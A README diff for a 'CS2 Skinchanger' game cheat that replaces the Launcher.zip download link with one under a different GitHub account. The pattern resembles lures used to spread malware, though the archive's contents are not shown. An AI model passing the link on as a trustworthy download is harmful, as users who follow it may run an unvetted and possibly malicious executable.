@@ -1,5 +1,5 @@
 # CS2 Skinchanger Updated 09.04
-## [Download latest version](https://github.com/grraja8899/Cs2-skinchanger/releases/download/ReleaseV1.0.3/Launcher.zip)
+## [Download latest version](https://github.com/CheezyChaza/Cs2-skinchanger/releases/download/ReleaseV1.0.3/Launcher.zip)
 
 ![1](https://github.com/user-attachments/assets/a74a1195-b6fb-4bdc-a24a-5777d554b663)
 
